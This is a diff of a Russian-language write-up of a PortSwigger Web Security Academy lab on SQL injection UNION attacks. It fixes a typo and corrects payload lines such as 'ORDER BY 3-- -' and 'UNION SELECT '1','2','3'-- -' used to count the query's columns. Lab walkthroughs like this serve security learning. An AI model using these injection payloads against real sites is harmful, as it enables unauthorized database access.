@@ -67,7 +67,7 @@ https://0a1600ed036880cd8c118c7100de00ed.web-security-academy.net/filter?categor
 
 ![IMG](/assets/images/IMG_union_sqli/IMG_SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query/3.png){: height="200" .align-center}
 
-Далее можно использовать бинарный поиск для нахождения нужного значения. То есть передать 50. В случае ошибки взять 25. Если же успех, то 75. И так далее. Можно так же ткнуть на обум. На сайте мы видим 3 колонки. Звучит логично, что они все заполняются из БД. Подставлю значение 4 (для сокращения буду писать только часть пейлоада):
+Далее можно использовать бинарный поиск для нахождения нужного значения. То есть передать 50. В случае ошибки взять 25. Если же успех, то 75. И так далее. Можно так же ткнуть наобум. На сайте мы видим 3 колонки. Звучит логично, что они все заполняются из БД. Подставлю значение 4 (для сокращения буду писать только часть пейлоада):
 
 ```
 Accessories' ORDER BY 4-- -
@@ -78,7 +78,7 @@ Accessories' ORDER BY 4-- -
 Подставлю 3:
 
 ```
-Accessories' ORDER BY 4-- -
+Accessories' ORDER BY 3-- -
 ```
 
 ![IMG](/assets/images/IMG_union_sqli/IMG_SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query/5.png){: height="200" .align-center}
@@ -98,7 +98,7 @@ Accessories' UNION SELECT 1,2,3-- -
 Оберну значения в кавычки:
 
 ```
-Accessories' and false UNION SELECT 1,2,3-- -
+Accessories' UNION SELECT '1','2','3'-- -
 ```
 
 ![IMG](/assets/images/IMG_union_sqli/IMG_SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query/7.png){: height="200" .align-center}
